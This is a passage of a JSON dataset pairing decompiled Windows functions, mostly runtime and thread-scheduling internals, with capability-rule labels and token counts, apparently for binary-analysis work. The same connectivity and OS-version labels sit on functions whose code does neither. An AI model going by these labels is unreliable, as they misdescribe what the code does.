(**0x4742a4)(2);\n        (*pcVar3)();\n    }\n    else {\n        pcVar3 = *(*piVar2 + 4);\n        (**0x4742a4)(var_ch, 2);\n        (*pcVar3)();\n    }\n    fcn.00430fbc();\n    fcn.00430fbc();\n    return;\n}\n",
        "token_count": 509
    },
    "0044c000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044c000(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t arg_8h_00;\n    int32_t in_ECX;\n    uint uVar4;\n    uint arg_14h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar4 = 1;\n    if (arg_ch == 0) {\n        pcVar3 = *(**(in_ECX + 0x20) + 4);\n        (**0x4742a4)(*(in_ECX + 0xc));\n        arg_14h = 0x44c05a;\n        uVar4 = (*pcVar3)();\n        fcn.0044660f(6, 4, uVar4, arg_14h);\n        fcn.0044d645(in_ECX);\n        uVar4 = 0;\n    }\n    else if (arg_ch != 1) {\n        if (arg_ch == 2) {\n            arg_8h_00 = *(in_ECX + 0x1c) + 0xc;\n            fcn.0044546b(arg_8h_00);\n            fcn.0044ce5c(in_ECX, arg_8h_00);\n        }\n        else if (arg_ch == 3) {\n            uVar4 = 2;\n        }\n    }\n    fcn.00430fbc();\n    piVar1 = *(in_ECX + 0xa0);\n    *(in_ECX + 0xa0) = 0;\n    piVar2 = *(in_ECX + 0x9c);\n    var_8h = arg_8h;\n    if (arg_8h == 0) {\n        pcVar3 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        var_8h = (*pcVar3)();\n    }\n    *(in_ECX + 0x2c) = 1;\n    pcVar3 = *(*piVar1 + 0x10);\n    (**0x4742a4)(arg_8h);\n    (*pcVar3)();\n    if (var_8h == 0) {\n        fcn.0044a119(4, 1);\n        fcn.00442c08();\n        pcVar3 = *(*piVar2 + 8);\n        (**0x4742a4)(uVar4);\n        (*pcVar3)();\n    }\n    else {\n        pcVar3 = *(*piVar2 + 4);\n        (**0x4742a4)(var_8h, uVar4);\n        (*pcVar3)();\n    }\n    if (arg_ch != 0) {\n        fcn.00430fbc();\n    }\n    return;\n}\n",
        "token_count": 649
    },
    "0044c1ff": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044c1ff(int32_t *param_1)\n\n{\n    uint arg_8h;\n    code *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    \n    param_1[0x2b] = param_1[0x2b] + 1;\n    uVar3 = param_1[0x2b];\n    if (uVar3 == 1) {\n        arg_8h = *(param_1[0x28] + 0x90);\n        fcn.0044a0d3(arg_8h);\n        fcn.00449d97(arg_8h);\n        uVar3 = param_1[0x2b];\n    }\n    if (0xff < uVar3) {\n        if (uVar3 == 0x100) {\n            *(param_1 + 0xb2) = 1;\n            fcn.0044a119(2, 1);\n            fcn.00449dff(param_1);\n            return;\n        }\n        if ((*(param_1 + 0xb3) & 2) == 0) {\n            fcn.004453c1(1);\n            while (cVar2 = fcn.00449dbc(param_1),  cVar2 == '\\0') {\n                pcVar1 = *(*param_1 + 0x20);\n                (**0x4742a4)();\n                (*pcVar1)();\n            }\n            fcn.004453c1(0);\n            *(param_1 + 0xb2) = 0;\n            if (param_1[0x2b] != 0) {\n                fcn.0044a093(*(param_1[0x28] + 0x90));\n            }\n            param_1[0x2b] = 0;\n            return;\n        }\n        param_1[0x2b] = uVar3 - 1;\n    }\n    pcVar1 = *(*param_1[0x27] + 0xc);\n    (**0x4742a4)();\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 469
    },
    "0044c2ff": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044c2ff(uint arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    uint32_t in_ECX;\n    uint32_t var_4h;\n    \n    var_4h = in_ECX & 0xffffff00 | *(in_ECX + 0xb2);\n    pcVar1 = *(*(in_ECX + 0xa0) + 0x48);\n    (**0x4742a4)(arg_8h, *(in_ECX + 0x1c), var_4h, 7);\n    cVar2 = (*pcVar1)();\n    if (cVar2 == '\\0') {\n        uVar3 = 0;\n    }\n    else {\n        fcn.0044bc97();\n        if (*(in_ECX + 0xac) != 0) {\n            fcn.0044a093(*(*(in_ECX + 0xa0) + 0x90));\n        }\n        *(in_ECX + 0xac) = 0;\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 253
    },
    "0044ce5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044ce5c(int32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *in_ECX;\n    uint *arg_8h_00;\n    uint in_stack_ffffffc0;\n    int32_t in_stack_ffffffc4;\n    uint *in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint var_14h;\n    \n    iVar3 = fcn.00442d5d();\n    if ((iVar3 == 0) || (piVar4 = fcn.0043f6fc(),  piVar4 != in_ECX)) {\n        *(arg_8h + 0xe4) = 1;\n    }\n    piVar4 = *(in_ECX[0x40] + 4);\n    if (0 < piVar4[0x6e]) {\n        in_stack_ffffffc8 = &fcn.0044ce5c::arg_ch;\n        fcn.0044546b(in_stack_ffffffc8);\n        pcVar1 = *(*piVar4 + 0x3c);\n        in_stack_ffffffc4 = arg_8h;\n        (**0x4742a4)();\n        in_stack_ffffffc0 = 0x44cebf;\n        cVar2 = (*pcVar1)();\n        if (cVar2 != '\\0') goto code_r0x0044cf2d;\n    }\n    pcVar1 = *(*in_ECX + 8);\n    (**0x4742a4)(arg_8h);\n    (*pcVar1)();\n    if (((in_ECX[3] & 0xfffffffU) != 0) && (cVar2 = fcn.004457d0(in_ECX + 3),  cVar2 != '\\0')) {\n        pcVar1 = *(*in_ECX + 4);\n        (**0x4742a4)();\n        (*pcVar1)();\n    }\n    if (0 < piVar4[0x6d]) {\n        fcn.0044546b(&fcn.0044ce5c::arg_ch);\n        arg_8h_00 = &fcn.0044ce5c::var_14h;\n        fcn.0044546b(arg_8h_00);\n        fcn.00444cff(in_ECX, arg_8h_00, in_stack_ffffffc0, in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc);\n    }\ncode_r0x0044cf2d:\n    *(arg_8h + 0xe4) = 0;\n    return;\n}\n",
        "token_count": 599
    },
    "0044d881": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d881(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *in_ECX;\n    uint var_10h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        fcn.00425638(\"proc\");\n        fcn.00451487(&var_10h, 0x48c934);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    piVar1 = *(in_ECX[0x40] + 4);\n    arg_8h_00 = fcn.0044361c(arg_8h, arg_ch);\n    if ((*(in_ECX[0x40] + 0x30) & 4) == 0) {\n        LOCK();\n        piVar4 = in_ECX[0x40] + 0x14;\n        *piVar4 = *piVar4 + 1;\n    }\n    fcn.0044d21b(arg_8h_00);\n    iVar3 = fcn.00442d5d();\n    if (iVar3 != 0) {\n        piVar4 = fcn.00430fbf();\n        if (piVar4 == piVar1) {\n            if (*(iVar3 + 0x4c) == '\\0') {\n                piVar4 = *(iVar3 + 0x9c) + 0x68;\n                *piVar4 = *piVar4 + 1;\n            }\n            else {\n                piVar4 = *(iVar3 + 0x9c) + 8;\n                *piVar4 = *piVar4 + 1;\n            }\n            goto code_r0x0044d944;\n        }\n    }\n    iVar3 = fcn.0043d4ec(piVar1[6]);\n    if (iVar3 == 0) {\n        var_4h = fcn.0043a4f7(0x1c, arg_8h_00);\n        if (var_4h == 0) {\n            iVar3 = 0;\n        }\n        else {\n            *(var_4h + 8) = 0;\n            *(var_4h + 0xc) = 0;\n            *(var_4h + 0x10) = 0;\n            *(var_4h + 0x14) = 0;\n            *(var_4h + 0x18) = 1;\n            iVar3 = var_4h;\n        }\n        fcn.0044cb92(iVar3);\n        fcn.0043d4fa(piVar1[6], iVar3);\n    }\n    *(iVar3 + 8) = *(iVar3 + 8) + 1;\ncode_r0x0044d944:\n    if ((in_ECX[3] & 0xfffffffU) != 0) {\n        pcVar2 = *(*in_ECX + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n    }\n    if (piVar1[0x6d] != piVar1[0x6e] && -1 < piVar1[0x6d] - piVar1[0x6e]) {\n        fcn.0044546b(in_ECX + 3);\n        pcVar2 = *(*piVar1 + 0x38);\n        (**0x4742a4)();\n        (*pcVar2)();\n    }\n    return;\n}\n",
        "token_count": 808
    },
    "0044d9dd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0044d9dd(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    uint unaff_ESI;\n    bool bVar5;\n    uint var_5ch;\n    uint32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    char var_46h;\n    uint var_45h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_58h = var_58h & 0xffffff00 | arg_8h & 0xff;\n    arg_8h_00 = 0;\n    var_45h._0_1_ = 0;\n    iVar4 = *(in_ECX + 0x98);\n    if (0 < iVar4) {\n        var_50h = 0;\n        var_46h = '\\0';\n        var_4ch = 0;\n        do {\n            piVar3 = fcn.004420a4(0x44da24);\n            if (piVar3 != NULL) {\n                if ((*piVar3 < piVar3[1]) || (piVar3[0x13] < piVar3[0x14])) {\n                    var_54h = fcn.0044e85c(var_58h, var_58h);\n                    if (var_54h != 0) goto code_r0x0044db87;\n                    if (var_46h == '\\0') {\n                        if (var_50h < 0xf) {\n                            *(&fcn.0044d9dd::var_45h + var_50h * 4 + 1) = var_4ch;\n                            var_50h = var_50h + 1;\n                            goto code_r0x0044daac;\n                        }\n                        var_54h = fcn.0044e759(var_58h);\n                        if (var_54h != 0) goto code_r0x0044db87;\n                    }\n                    if (((piVar3[0xe] != 1) || (*piVar3 < piVar3[1])) || (bVar5 = true,  piVar3[0x13] < piVar3[0x14])) {\n                        bVar5 = false;\n                    }\n                }\n                else {\n                    bVar5 = piVar3[0xe] == 1;\n                }\n                var_45h._0_1_ = var_45h | bVar5;\n            }\ncode_r0x0044daac:\n            var_4ch = var_4ch + 1;\n        } while (var_4ch < iVar4);\n        if (0 < var_50h) {\n            var_4ch = 0;\n            do {\n                piVar3 = fcn.004420a4(0x44dad1);\n                if (piVar3 != NULL) {\n                    if (((piVar3[1] != *piVar3 && *piVar3 <= piVar3[1]) || (piVar3[0x13] < piVar3[0x14])) &&\n                       (var_54h = fcn.0044e759(var_58h),  var_54h != 0)) goto code_r0x0044db87;\n                    if (((piVar3[0xe] != 1) || (piVar3[1] != *piVar3 && *piVar3 <= piVar3[1])) ||\n                       (uVar1 = 1,  piVar3[0x13] < piVar3[0x14])) {\n                        uVar1 = 0;\n                    }\n                    var_45h._0_1_ = var_45h | uVar1;\n                }\n                var_4ch = var_4ch + 1;\n            } while (var_4ch < var_50h);\n        }\n    }\n    cVar2 = fcn.0044d0e4(&fcn.0044d9dd::var_54h);\n    if (cVar2 == '\\0') {\n        if (((0 < *(in_ECX + 0xe8)) && (var_45h != 0)) && (0 < *(in_ECX + 0x98))) {\n            do {\n                iVar4 = fcn.004420a4(arg_8h_00);\n                if (((iVar4 != 0) && (*(iVar4 + 0x38) == 1)) && (*(iVar4 + 0x50) <= *(iVar4 + 0x4c))) {\n                    fcn.0044d7e7(iVar4);\n                }\n                arg_8h_00 = arg_8h_00 + 1;\n            } while (arg_8h_00 < *(in_ECX + 0x98));\n        }\n    }\n    else {\n        fcn.0044eb14(1);\n    }\ncode_r0x0044db87:\n    fcn.0043a2e7(unaff_ESI);\n    return;\n}\n",
        "token_count": 1173
    },
    "0044252a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044252a(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *arg_8h_00;\n    int32_t in_ECX;\n    uint var_20h;\n    uint var_14h;\n    uint32_t var_8h;\n    uint *var_4h;\n    \n    if (arg_8h == 0) {\n        fcn.00425638(\"ppVirtualProcessorRoots\");\n        arg_8h_00 = &var_14h;\n    }\n    else {\n        if (arg_ch != 0) {\n            var_8h = 0;\n            if (arg_ch != 0) {\n                do {\n                    var_4h = *(arg_8h + var_8h * 4);\n                    pcVar1 = **var_4h;\n                    (**0x4742a4)();\n                    iVar2 = (*pcVar1)();\n                    if (*(*(*(in_ECX + 0x24) + iVar2 * 4) + 0xbc) == 0) {\n                        fcn.0044c617();\n                    }\n                    fcn.0044a9fa(var_4h, 0);\n                    LOCK();\n                    *(in_ECX + 0x14) = *(in_ECX + 0x14) + 1;\n                    var_8h = var_8h + 1;\n                } while (var_8h < arg_ch);\n            }\n            return;\n        }\n        fcn.00425638(\"count\");\n        arg_8h_00 = &var_20h;\n    }\n    fcn.00451487(arg_8h_00, 0x48c934);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 404
    },
    "00444a13": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444a13(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint *arg_8h_00;\n    char cVar3;\n    int32_t arg_8h_01;\n    char *unaff_EBX;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    if (arg_8h == 0) {\n        unaff_EBX = \"ppVirtualProcessorRoots\";\n    }\n    else if (arg_ch != 0) {\n        var_ch = 0;\n        if (arg_ch != 0) {\n            do {\n                uVar2 = var_ch;\n                var_4h = *(arg_8h + var_ch * 4);\n                pcVar1 = **var_4h;\n                (**0x4742a4)();\n                (*pcVar1)();\n                arg_8h_01 = fcn.0044ab5a(var_4h);\n                arg_8h_00 = var_4h;\n                while (arg_8h_01 == 0) {\n                    var_14h = 0;\n                    var_10h = 0x43d8bf;\n                    do {\n                        cVar3 = fcn.0043bebc();\n                    } while (cVar3 != '\\0');\n                    sub.KERNEL32.dll_SwitchToThread();\n                    pcVar1 = **arg_8h_00;\n                    (**0x4742a4)();\n                    (*pcVar1)();\n                    arg_8h_01 = fcn.0044ab5a(arg_8h_00);\n                    uVar2 = var_ch;\n                }\n                if (*(arg_8h_01 + 0xac) != '\\0') {\n                    arg_8h_01 = fcn.0044b7f5(arg_8h_01);\n                }\n                if (arg_8h_01 != 0) {\n                    fcn.0044a189();\n                }\n                var_ch = uVar2 + 1;\n            } while (var_ch < arg_ch);\n        }\n        return;\n    }\n    fcn.00425638(unaff_EBX);\n    fcn.00451487(&var_18h, 0x48c934);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 557
    },
    "00444dac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00444dac(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *arg_8h_00;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (0 < *(in_ECX + 0x2c)) {\n        do {\n            iVar5 = *(*(in_ECX + 0x20) + var_4h * 4);\n            if ((iVar5 != 0) && (0 < *(iVar5 + 0x78))) {\n                iVar7 = 0;\n                do {\n                    iVar2 = fcn.004420a4(iVar7);\n                    if (iVar2 != 0) {\n                        iVar6 = *(iVar2 + 0x68) - *(iVar2 + 0x70);\n                        *(iVar2 + 0x70) = *(iVar2 + 0x68);\n                        iVar4 = *(iVar2 + 0x6c) - *(iVar2 + 0x74);\n                        *(iVar2 + 0x74) = *(iVar2 + 0x6c);\n                        *arg_ch = *arg_ch + iVar6;\n                        *arg_8h = *arg_8h + iVar4;\n                        *arg_10h = *arg_10h + (iVar6 - iVar4);\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < *(iVar5 + 0x78));\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < *(in_ECX + 0x2c));\n    }\n    iVar2 = 0;\n    iVar7 = *(in_ECX + 0x1bc) - *(in_ECX + 0x1c4);\n    *(in_ECX + 0x1c4) = *(in_ECX + 0x1bc);\n    iVar5 = *(in_ECX + 0x1c0) - *(in_ECX + 0x1c8);\n    *(in_ECX + 0x1c8) = *(in_ECX + 0x1c0);\n    *arg_ch = *arg_ch + iVar7;\n    *arg_8h = *arg_8h + iVar5;\n    *arg_10h = *arg_10h + (iVar7 - iVar5);\n    piVar3 = arg_10h;\n    if (0 < *(in_ECX + 0x108)) {\n        do {\n            arg_8h_00 = fcn.004420a4(iVar2);\n            if (arg_8h_00 != NULL) {\n                iVar7 = arg_8h_00[2] - arg_8h_00[4];\n                arg_8h_00[4] = arg_8h_00[2];\n                iVar5 = arg_8h_00[3] - arg_8h_00[5];\n                arg_8h_00[5] = arg_8h_00[3];\n                *arg_ch = *arg_ch + iVar7;\n                *arg_8h = *arg_8h + iVar5;\n                *arg_10h = *arg_10h + (iVar7 - iVar5);\n                cVar1 = fcn.00443f46();\n                if (cVar1 == '\\0') {\n                    fcn.0044473b(arg_8h_00, *arg_8h_00, 0);\n                    fcn.0043a7bc(arg_8h_00);\n                }\n            }\n            iVar2 = iVar2 + 1;\n            piVar3 = in_ECX + 200;\n        } while (iVar2 < *(in_ECX + 0x108));\n    }\n    return piVar3;\n}\n",
        "token_count": 918
    },
    "0044fd72": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044fd72(uint32_t *param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t *var_4h;\n    \n    var_4h = param_1;\n    if (*param_1 == 8) {\n        uVar2 = fcn.0044d346();\n        if (uVar2 == 0) goto code_r0x0044fde3;\n        *param_1 = 2;\n    }\n    else {\n        if (*param_1 != 0x10) goto code_r0x0044fde3;\n        if (param_1[2] == 1) {\n            cVar1 = fcn.0044d0e4(&var_4h);\n            uVar2 = -(cVar1 != '\\0') & var_4h;\n            if (uVar2 != 0) {\n                fcn.0044eb14(1);\n                param_1[2] = uVar2;\n                *param_1 = 4;\n            }\n            goto code_r0x0044fde3;\n        }\n        uVar2 = fcn.0044e759(0);\n        if (uVar2 == 0) goto code_r0x0044fde3;\n        *param_1 = 4;\n    }\n    param_1[2] = uVar2;\ncode_r0x0044fde3:\n    return *param_1 & 0xffffff00 | 1 - ((*param_1 & 0x18) != 0);\n}\n",
        "token_count": 350
    },
    "00450406": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00450406(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t arg_ch_00;\n    char cVar1;\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    uint uVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_10h == 0) || (cVar1 = fcn.0044f99c(arg_8h, arg_10h, arg_14h, arg_18h, arg_20h),  cVar1 == '\\0')) {\n        if (arg_18h == 0) {\n            arg_8h_00 = fcn.0044f90c(&var_4h);\n            arg_ch_00 = var_4h;\n        }\n        else {\n            arg_8h_00 = fcn.0044f8d1(&var_4h);\n            arg_ch_00 = var_4h;\n        }\n        while (arg_8h_00 != 0) {\n            arg_8h_01 = fcn.0044f711(*(in_ECX + 8));\n            if ((arg_8h_01 != 0) && (cVar1 = fcn.0044fc3d(arg_8h_01, arg_8h, arg_20h, arg_1ch),  cVar1 != '\\0'))\n            goto code_r0x00450500;\n            cVar1 = fcn.00450af1(arg_8h_00, arg_10h, arg_18h, arg_20h);\n            if ((cVar1 == '\\0') && (cVar1 = fcn.0044f94a(arg_8h, arg_8h_00, arg_14h),  cVar1 != '\\0')) {\n                if (arg_18h == 0) {\n                    *(arg_ch + 0xb4) = (var_4h + 1) % *(arg_ch + 0xa0);\n                }\n                else {\n                    *(arg_ch + 0xb0) = (var_4h + 1) % *(arg_ch + 0x50);\n                }\n                goto code_r0x00450500;\n            }\n            arg_8h_00 = fcn.00443525(&var_4h, arg_ch_00, (-(arg_18h != 0) & 0xffffffb0) + 0x60 + arg_ch);\n        }\n        uVar2 = 0;\n    }\n    else {\ncode_r0x00450500:\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 645
    },
    "00450614": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00450614(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t arg_ch_00;\n    char cVar1;\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    uint uVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_10h == 0) || (cVar1 = fcn.0044fb2c(arg_8h, arg_10h, arg_14h, arg_18h, arg_20h),  cVar1 == '\\0')) {\n        if (arg_18h == 0) {\n            arg_8h_00 = fcn.0044f90c(&var_4h);\n            arg_ch_00 = var_4h;\n        }\n        else {\n            arg_8h_00 = fcn.0044f8d1(&var_4h);\n            arg_ch_00 = var_4h;\n        }\n        while (arg_8h_00 != 0) {\n            arg_8h_01 = fcn.0044f711(*(in_ECX + 8));\n            if ((arg_8h_01 != 0) && (cVar1 = fcn.0044fc3d(arg_8h_01, arg_8h, arg_20h, arg_1ch),  cVar1 != '\\0'))\n            goto code_r0x00450715;\n            cVar1 = fcn.00450af1(arg_8h_00, arg_10h, arg_18h, arg_20h);\n            if ((cVar1 == '\\0') && (cVar1 = fcn.0044fad7(arg_8h, arg_8h_00, arg_20h, arg_14h),  cVar1 != '\\0')) {\n                if (arg_18h == 0) {\n                    *(arg_ch + 0xb4) = (var_4h + 1) % *(arg_ch + 0xa0);\n                }\n                else {\n                    *(arg_ch + 0xb0) = (var_4h + 1) % *(arg_ch + 0x50);\n                }\n                goto code_r0x00450715;\n            }\n            arg_8h_00 = fcn.00443525(&var_4h, arg_ch_00, (-(arg_18h != 0) & 0xffffffb0) + 0x60 + arg_ch);\n        }\n        uVar2 = 0;\n    }\n    else {\ncode_r0x00450715:\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 649
    },
    "004546c7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004546c7(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_EDI;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    \n    *(unaff_EBX + -4) = *(unaff_EBP + -0x2c);\n    fcn.00450fab(*(unaff_EBP + -0x30));\n    iVar1 = fcn.004543fc();\n    *(iVar1 + 0x10) = *(unaff_EBP + -0x34);\n    iVar1 = fcn.004543fc();\n    *(iVar1 + 0x14) = *(unaff_EBP + -0x38);\n    if (((((*unaff_EDI == -0x1f928c9d) && (unaff_EDI[4] == 3)) &&\n         ((unaff_EDI[5] == 0x19930520 || ((unaff_EDI[5] == 0x19930521 || (unaff_EDI[5] == 0x19930522)))))) &&\n        (*(unaff_EBP + -0x3c) == 0)) &&\n       ((*(unaff_EBP + -0x1c) != 0 && (iVar1 = fcn.00451206(unaff_EDI[6]),  iVar1 != 0)))) {\n        fcn.00451170(unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "00454782": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00454782(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, int32_t arg_20h, \n            uint *arg_24h, uint arg_28h, int32_t arg_2ch)\n\n{\n    int32_t iVar1;\n    \n    if (arg_20h != 0) {\n        fcn.00454d7d(arg_8h, arg_ch, arg_1ch, arg_20h);\n    }\n    if (arg_2ch == 0) {\n        arg_2ch = arg_ch;\n    }\n    fcn.00450f01(arg_2ch, arg_8h);\n    fcn.00454f40(arg_ch, arg_14h, arg_18h, *arg_24h);\n    *(arg_ch + 8) = arg_24h[1] + 1;\n    iVar1 = fcn.0045458c(arg_8h, arg_ch, arg_10h, arg_18h, *(arg_1ch + 0xc), arg_28h, 0x100);\n    if (iVar1 != 0) {\n        fcn.00450ecf(iVar1, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 297
    },
    "00454845": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
